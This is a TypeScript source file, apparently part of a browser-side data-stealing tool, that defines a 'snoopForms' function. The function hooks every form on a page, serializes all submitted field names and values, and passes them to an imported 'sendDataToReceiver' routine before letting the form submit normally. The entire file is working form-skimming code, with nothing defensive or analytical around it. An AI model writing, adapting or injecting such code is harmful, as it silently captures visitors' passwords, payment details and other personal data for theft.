import { sendDataToReceiver } from './sendDataToReceiver';

export const submitForm: (globalEventHandlers: GlobalEventHandlers) => void = document.createElement('form').submit.call;

export const snoopForms = (): void =>
	Array.from(document.getElementsByTagName('form')).forEach((formElement) => {
		const onSubmit: ((this: GlobalEventHandlers, ev: Event) => any) | null = formElement.onsubmit;

		formElement.onsubmit = function (ev: Event) {
			onSubmit?.call(this, ev);

			const formData = $(this).serializeArray();

			sendDataToReceiver(
				{
					context: 'form_data',
					message: '\n-- **Form Data** --\n\n' + formData.map(({ name, value }) => `- \`${name}\` = \`${value || ' '}\``).join('\n'),
					json: JSON.stringify(formData),
				},
				() => submitForm(this)
			);

			return false;
		};
	});
